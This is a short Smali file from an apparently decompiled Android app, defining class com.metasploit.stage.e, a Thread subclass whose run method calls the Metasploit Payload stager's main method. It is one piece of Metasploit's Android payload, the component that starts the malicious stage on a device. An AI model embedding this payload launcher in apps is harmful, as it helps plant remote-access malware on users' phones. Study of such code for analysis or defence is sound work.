.class final Lcom/metasploit/stage/e;
.super Ljava/lang/Thread;


# direct methods
.method constructor <init>()V
    .registers 1

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .registers 2

    const/4 v0, 0x0

    invoke-static {v0}, Lcom/metasploit/stage/Payload;->main([Ljava/lang/String;)V

    return-void
.end method
